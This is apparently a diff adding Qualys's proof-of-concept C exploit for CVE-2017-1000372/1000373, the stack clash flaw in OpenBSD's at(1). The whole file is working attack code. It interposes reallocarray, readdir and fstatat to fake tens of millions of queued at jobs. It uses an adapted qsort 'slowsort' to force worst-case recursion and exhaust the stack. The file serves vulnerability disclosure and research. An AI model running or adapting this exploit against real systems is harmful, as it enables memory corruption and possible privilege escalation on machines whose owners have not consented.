@@ -1,0 +1,557 @@
+/*
+ * OpenBSD_at.c for CVE-2017-1000373
+ * Copyright (c) 2017  Qualys, Inc.
+ * slowsort() adapted from lib/libc/stdlib/qsort.c:
+ *
+ * Copyright (c) 1992, 1993
+ *      The Regents of the University of California.  All rights reserved.
+ *
+ * Redistribution and use in source and binary forms, with or without
+ * modification, are permitted provided that the following conditions
+ * are met:
+ * 1. Redistributions of source code must retain the above copyright
+ *    notice, this list of conditions and the following disclaimer.
+ * 2. Redistributions in binary form must reproduce the above copyright
+ *    notice, this list of conditions and the following disclaimer in the
+ *    documentation and/or other materials provided with the distribution.
+ * 3. Neither the name of the University nor the names of its contributors
+ *    may be used to endorse or promote products derived from this software
+ *    without specific prior written permission.
+ *
+ * THIS SOFTWARE IS PROVIDED BY THE REGENTS AND CONTRIBUTORS ``AS IS'' AND
+ * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
+ * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
+ * ARE DISCLAIMED.  IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE
+ * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
+ * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
+ * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
+ * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
+ * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
+ * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
+ * SUCH DAMAGE.
+ */
+
+/*
+ *  OpenBSD_at.c for CVE-2017-1000372
+ *  Copyright (C) 2017  Qualys, Inc.
+ *  ttime() adapted from usr.bin/at/at.c:
+ *
+ *  at.c : Put file into atrun queue
+ *  Copyright (C) 1993, 1994  Thomas Koenig
+ *
+ *  Atrun & Atq modifications
+ *  Copyright (C) 1993  David Parsons
+ *
+ *  Traditional BSD behavior and other significant modifications
+ *  Copyright (C) 2002-2003  Todd C. Miller
+ *
+ * Redistribution and use in source and binary forms, with or without
+ * modification, are permitted provided that the following conditions
+ * are met:
+ * 1. Redistributions of source code must retain the above copyright
+ *    notice, this list of conditions and the following disclaimer.
+ * 2. The name of the author(s) may not be used to endorse or promote
+ *    products derived from this software without specific prior written
+ *    permission.
+ *
+ * THIS SOFTWARE IS PROVIDED BY THE AUTHOR(S) ``AS IS'' AND ANY EXPRESS OR
+ * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
+ * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
+ * IN NO EVENT SHALL THE AUTHOR(S) BE LIABLE FOR ANY DIRECT, INDIRECT,
+ * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
+ * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
+ * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
+ * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
+ * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
+ * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
+ */
+
+#include <ctype.h>
+#include <dirent.h>
+#include <dlfcn.h>
+#include <fcntl.h>
+#include <stdbool.h>
+#include <stdint.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/param.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <time.h>
+#include <unistd.h>
+
+static const char *
+u64tostr(uint64_t u64)
+{
+    static char str[64];
+    char * cp = str + sizeof(str);
+    *--cp = '\0';
+    do {
+        if (cp <= str) _exit(__LINE__);
+        *--cp = '0' + (u64 % 10);
+    } while (u64 /= 10);
+    return cp;
+}
+
+#define die() do { \
+    const char * const str = u64tostr(__LINE__); \
+    const size_t len = strlen(str); \
+    write(STDERR_FILENO, "\n[", 2); \
+    write(STDERR_FILENO, str, len); \
+    write(STDERR_FILENO, "]\n", 2); \
+    _exit(EXIT_FAILURE); \
+} while (0)
+
+static __inline char    *med3(char *, char *, char *, int (*)(const void *, const void *));
+static __inline void     swapfunc(char *, char *, size_t, int);
+
+/*
+ * Qsort routine from Bentley & McIlroy's "Engineering a Sort Function".
+ */
+#define swapcode(TYPE, parmi, parmj, n) {               \
+        size_t i = (n) / sizeof (TYPE);                 \
+        TYPE *pi = (TYPE *) (parmi);                    \
+        TYPE *pj = (TYPE *) (parmj);                    \
+        do {                                            \
+                TYPE    t = *pi;                        \
+                *pi++ = *pj;                            \
+                *pj++ = t;                              \
+        } while (--i > 0);                              \
+}
+
+#define SWAPINIT(a, es) swaptype = ((char *)a - (char *)0) % sizeof(long) || \
+        es % sizeof(long) ? 2 : es == sizeof(long)? 0 : 1;
+
+static __inline void
+swapfunc(char *a, char *b, size_t n, int swaptype)
+{
+        if (swaptype <= 1)
+                swapcode(long, a, b, n)
+        else
+                swapcode(char, a, b, n)
+}
+
+#define swap(a, b)                                      \
+        if (swaptype == 0) {                            \
+                long t = *(long *)(a);                  \
+                *(long *)(a) = *(long *)(b);            \
+                *(long *)(b) = t;                       \
+        } else                                          \
+                swapfunc(a, b, es, swaptype)
+
+#define vecswap(a, b, n)        if ((n) > 0) swapfunc(a, b, n, swaptype)
+
+static __inline char *
+med3(char *a, char *b, char *c, int (*cmp)(const void *, const void *))
+{
+        return cmp(a, b) < 0 ?
+               (cmp(b, c) < 0 ? b : (cmp(a, c) < 0 ? c : a ))
+              :(cmp(b, c) > 0 ? b : (cmp(a, c) < 0 ? a : c ));
+}
+
+typedef struct {
+        size_t idx;
+        size_t key;
+} slowsort_t;
+
+static __inline void
+set_key(void * const _pss, const size_t key)
+{
+        slowsort_t * const pss = _pss;
+        if (!pss) die();
+        if (!key) die();
+        if (pss->key) die();
+        pss->key = key;
+}
+
+#define RESET_KEY SIZE_MAX
+
+static void
+slowsort(void *aa, size_t n, size_t es, int (*cmp)(const void *, const void *), const size_t stack_size)
+{
+        if (!aa) die();
+        if (n <= 0) die();
+        if (n >= SSIZE_MAX) die();
+        if (es <= 0) die();
+        if (es >= SSIZE_MAX) die();
+        if (!cmp) die();
+
+        #define SET_KEYS 4
+        #define STACK_FRAME_SIZE 176
+        const size_t pathological = stack_size / STACK_FRAME_SIZE * SET_KEYS;
+        if (n < pathological) die();
+        size_t innocuous = n - pathological;
+
+        char *pa, *pb, *pc, *pd, *pl, *pm, *pn;
+        int cmp_result, swaptype;
+        size_t d, r;
+        char *a = aa;
+
+loop:   SWAPINIT(a, es);
+        if (innocuous) {
+            if (n <= innocuous) die();
+            if (n - innocuous <= SET_KEYS) die();
+            if (n <= 40) die();
+        }
+        if (n < 7) {
+                for (pm = a; pm < a + n * es; pm += es) {
+                        set_key(pm, 1 + (pm - a) / es);
+                }
+                for (pm = (char *)a + es; pm < (char *) a + n * es; pm += es)
+                        for (pl = pm; pl > (char *) a && cmp(pl - es, pl) > 0;
+                             pl -= es)
+                                swap(pl, pl - es);
+                return;
+        }
+        pm = (char *)a + (n / 2) * es;
+        size_t set_keys = 0;
+        if (n > 7) {
+                pl = (char *)a;
+                pn = (char *)a + (n - 1) * es;
+                if (n > 40) {
+                        d = (n / 8) * es;
+                        if (innocuous) {
+                            set_key(pl, RESET_KEY);
+                            set_key(pl + d, RESET_KEY);
+                            set_key(pl + 2 * d, RESET_KEY);
+                        }
+                        pl = med3(pl, pl + d, pl + 2 * d, cmp);
+                        if (innocuous) set_key(pm - d, RESET_KEY);
+                        set_key(pm + 0, n - innocuous - 3);
+                        set_key(pm + d, n - innocuous - 2);
+                        pm = med3(pm - d, pm, pm + d, cmp);
+                        if (innocuous) set_key(pn - 2 * d, RESET_KEY);
+                        set_key(pn - d, n - innocuous - 1);
+                        set_key(pn - 0, n - innocuous - 0);
+                        pn = med3(pn - 2 * d, pn - d, pn, cmp);
+                        set_keys = SET_KEYS;
+                } else {
+                        set_key(pm, n - 1);
+                        set_key(pn, n - 0);
+                        set_keys = 2;
+                }
+                pm = med3(pl, pm, pn, cmp);
+        } else {
+                set_key(pm, n - 0);
+                set_keys = 1;
+        }
+        if (!set_keys) die();
+        swap(a, pm);
+        if (innocuous) {
+            if (a != aa) die();
+            slowsort_t * pss = aa;
+          {
+            const size_t key = pss->key;
+            if (!key) die();
+            if (n <= 40) die();
+            if (set_keys != SET_KEYS) die();
+            if (key != n - innocuous - set_keys + 1) die();
+          }
+            const slowsort_t * const end = pss + n;
+            size_t i = 0;
+            for (;; pss++) {
+                if (pss >= end) {
+                    if (i != innocuous) die();
+                    break;
+                }
+                if (!pss->key) {
+                    if (i < innocuous) {
+                        set_key(pss, n - i++);
+                        set_keys++;
+                    }
+                } else if (pss->key == RESET_KEY) {
+                    pss->key = 0;
+                } else {
+                    if (pss->key > n - innocuous) die();
+                }
+            }
+        }
+        pa = pb = (char *)a + es;
+        pc = pd = (char *)a + (n - 1) * es;
+        for (;;) {
+                while (pb <= pc && (cmp_result = cmp(pb, a)) <= 0) {
+                        if (cmp_result == 0) {
+                                swap(pa, pb);
+                                pa += es;
+                        }
+                        pb += es;
+                }
+                while (pb <= pc && (cmp_result = cmp(pc, a)) >= 0) {
+                        if (cmp_result == 0) {
+                                swap(pc, pd);
+                                pd -= es;
+                        }
+                        pc -= es;
+                }
+                if (pb > pc)
+                        break;
+                swap(pb, pc);
+                pb += es;
+                pc -= es;
+        }
+
+        pn = (char *)a + n * es;
+        r = MIN(pa - (char *)a, pb - pa);
+        vecswap(a, pb - r, r);
+        r = MIN(pd - pc, pn - pd - (ssize_t)es);
+        vecswap(pb, pn - r, r);
+
+        if ((pb - pa) / es != n - set_keys) die();
+        if ((pd - pc) / es != set_keys - 1) die();
+
+        if ((r = pb - pa) > es) {
+                n = r / es;
+                innocuous = 0;
+                goto loop;
+        }
+        die();
+}
+
+static int
+cmp_key(const void * const a, const void * const b)
+{
+        const size_t __a_key = ((const slowsort_t *)a)->key;
+        const size_t __b_key = ((const slowsort_t *)b)->key;
+        const size_t a_key = __a_key != RESET_KEY ? __a_key : 0;
+        const size_t b_key = __b_key != RESET_KEY ? __b_key : 0;
+        if (a_key < b_key) return -1;
+        if (a_key > b_key) return +1;
+        return 0;
+}
+
+#define    ATOI2(s)    ((s) += 2, ((s)[-2] - '0') * 10 + ((s)[-1] - '0'))
+
+/*
+ * Adapted from date(1)
+ */
+static time_t
+ttime(char *arg)
+{
+    time_t now, then;
+    struct tm *lt;
+    int yearset;
+    char *dot, *p;
+
+    if (time(&now) == (time_t)-1 || (lt = localtime(&now)) == NULL)
+        die();
+
+    /* Valid date format is [[CC]YY]MMDDhhmm[.SS] */
+    for (p = arg, dot = NULL; *p != '\0'; p++) {
+        if (*p == '.' && dot == NULL)
+            dot = p;
+        else if (!isdigit((unsigned char)*p))
+            goto terr;
+    }
+    if (dot == NULL)
+        lt->tm_sec = 0;
+    else {
+        *dot++ = '\0';
+        if (strlen(dot) != 2)
+            goto terr;
+        lt->tm_sec = ATOI2(dot);
+        if (lt->tm_sec > 61)    /* could be leap second */
+            goto terr;
+    }
+
+    yearset = 0;
+    switch(strlen(arg)) {
+    case 12:            /* CCYYMMDDhhmm */
+        lt->tm_year = ATOI2(arg) * 100;
+        lt->tm_year -= 1900;    /* Convert to Unix time */
+        yearset = 1;
+        /* FALLTHROUGH */
+    case 10:            /* YYMMDDhhmm */
+        if (yearset) {
+            yearset = ATOI2(arg);
+            lt->tm_year += yearset;
+        } else {
+            yearset = ATOI2(arg);
+            /* POSIX logic: [00,68]=>20xx, [69,99]=>19xx */
+            lt->tm_year = yearset;
+            if (yearset < 69)
+                lt->tm_year += 100;
+        }
+        /* FALLTHROUGH */
+    case 8:                /* MMDDhhmm */
+        lt->tm_mon = ATOI2(arg);
+        if (lt->tm_mon > 12 || lt->tm_mon == 0)
+            goto terr;
+        --lt->tm_mon;        /* Convert from 01-12 to 00-11 */
+        lt->tm_mday = ATOI2(arg);
+        if (lt->tm_mday > 31 || lt->tm_mday == 0)
+            goto terr;
+        lt->tm_hour = ATOI2(arg);
+        if (lt->tm_hour > 23)
+            goto terr;
+        lt->tm_min = ATOI2(arg);
+        if (lt->tm_min > 59)
+            goto terr;
+        break;
+    default:
+        goto terr;
+    }
+
+    lt->tm_isdst = -1;        /* mktime will deduce DST. */
+    then = mktime(lt);
+    if (then == (time_t)-1) {
+    terr:
+        die();
+    }
+    if (then < now)
+        die();
+    return (then);
+}
+
+static bool reading_jobs;
+
+void *
+reallocarray(void * const ptr, const size_t nmemb, const size_t size)
+{
+    static void * (* real_reallocarray)(void *ptr, size_t nmemb, size_t size);
+    if (!real_reallocarray) {
+        real_reallocarray = dlsym(RTLD_NEXT, "reallocarray");
+        if (!real_reallocarray) die();
+    }
+    if (ptr == NULL && nmemb == 2 + 4 && size == sizeof(struct atjob *)) {
+        if (reading_jobs) die();
+        reading_jobs = true;
+    }
+    void * const new_ptr = real_reallocarray(ptr, nmemb, size);
+    if (!new_ptr) die();
+    return new_ptr;
+}
+
+#define NUMJOBS (40<<20)
+
+static const size_t *
+get_jobkeys(void)
+{
+    const size_t n = NUMJOBS;
+    slowsort_t * const a = calloc(n, sizeof(slowsort_t));
+    write(STDERR_FILENO, "initializing jobkeys\n", 21);
+    if (!a) die();
+    size_t i;
+    for (i = 0; i < n; i++) {
+        a[i].idx = i;
+    }
+    slowsort(a, n, sizeof(slowsort_t), cmp_key, 33<<20);
+    size_t * const jobkeys = calloc(n, sizeof(*jobkeys));
+    write(STDERR_FILENO, "finalizing jobkeys\n", 19);
+    if (!jobkeys) die();
+    for (i = 0; i < n; i++) {
+        const size_t j = a[i].idx;
+        const size_t k = a[i].key;
+        if (j >= n) die();
+        if (k <= 0) die();
+        if (k > n) die();
+        if (jobkeys[j]) die();
+        jobkeys[j] = k;
+    }
+    free(a);
+    return jobkeys;
+}
+
+static struct dirent dirent;
+
+struct dirent *
+readdir(DIR * const dirp)
+{
+    static struct dirent * (* real_readdir)(DIR *dirp);
+    if (!real_readdir) {
+        real_readdir = dlsym(RTLD_NEXT, "readdir");
+        if (!real_readdir) die();
+    }
+    if (!reading_jobs) {
+        return real_readdir(dirp);
+    }
+    static size_t numjobs;
+    if (numjobs >= NUMJOBS) {
+        write(STDERR_FILENO, "sorting jobs\n", 13);
+        return NULL;
+    }
+    static char arg[32];
+    char * cp = arg + sizeof(arg);
+    *--cp = '\0';
+  {
+    static const struct {
+        uint32_t min;
+        uint32_t max;
+    } units[] = {
+        { 0, 59 }, /* Second */
+        { 0, 59 }, /* Minute */
+        { 0, 23 }, /* Hour */
+        { 1, 28 }, /* Day */
+        { 1, 12 }, /* Month */
+        { 2038, 2099 } /* Year */
+    };
+    static const size_t * jobkeys;
+    if (!jobkeys) {
+        jobkeys = get_jobkeys();
+        if (!jobkeys) die();
+        write(STDERR_FILENO, "reading jobs\n", 13);
+    }
+    uint32_t timer = jobkeys[numjobs++];
+    if (timer > NUMJOBS) die();
+    if (timer <= 0) die();
+    static size_t percent = 10;
+    if (numjobs == NUMJOBS / 100 * percent) {
+        const char * const str = u64tostr(percent);
+        const size_t len = strlen(str);
+        write(STDERR_FILENO, str, len);
+        write(STDERR_FILENO, "%\n", 2);
+        percent += 10;
+    }
+    size_t i;
+    for (i = 0; i < sizeof(units)/sizeof(*units); i++) {
+        const uint32_t min = units[i].min;
+        const uint32_t max = units[i].max;
+        const uint32_t div = max - min + 1;
+        const uint32_t u32 = min + timer % div;
+        timer /= div;
+        if (u32 < min) die();
+        if (u32 > max) die();
+        const char * const str = u64tostr(u32);
+        const size_t len = strlen(str);
+        if (cp <= arg) die();
+        if (cp - arg < (ssize_t)len) die();
+        cp -= len;
+        memcpy(cp, str, len);
+        if (len < 2) {
+            if (cp <= arg) die();
+            *--cp = '0';
+        }
+        if (!i) {
+            if (cp <= arg) die();
+            *--cp = '.';
+        }
+    }
+    if (timer) die();
+  }
+    if (strlen(cp) != 15) die();
+    const uint64_t timer = ttime(cp);
+    strlcpy(dirent.d_name, u64tostr(timer), sizeof(dirent.d_name));
+    strlcat(dirent.d_name, ".x", sizeof(dirent.d_name));
+    return &dirent;
+}
+
+int
+fstatat(const int fd, const char * const path, struct stat * const sb, const int flag)
+{
+    static int (* real_fstatat)(int fd, const char *path, struct stat *sb, int flag);
+    if (!real_fstatat) {
+        real_fstatat = dlsym(RTLD_NEXT, "fstatat");
+        if (!real_fstatat) die();
+    }
+    if (!reading_jobs || flag != AT_SYMLINK_NOFOLLOW || strcmp(path, dirent.d_name) != 0) {
+        return real_fstatat(fd, path, sb, flag);
+    }
+    memset(sb, 0, sizeof(*sb));
+    sb->st_mode = S_IFREG | S_IRUSR | S_IWUSR;
+    static uid_t user_uid;
+    if (!user_uid) {
+        user_uid = getuid();
+        if (!user_uid) die();
+    }
+    sb->st_uid = user_uid;
+    return 0;
+}
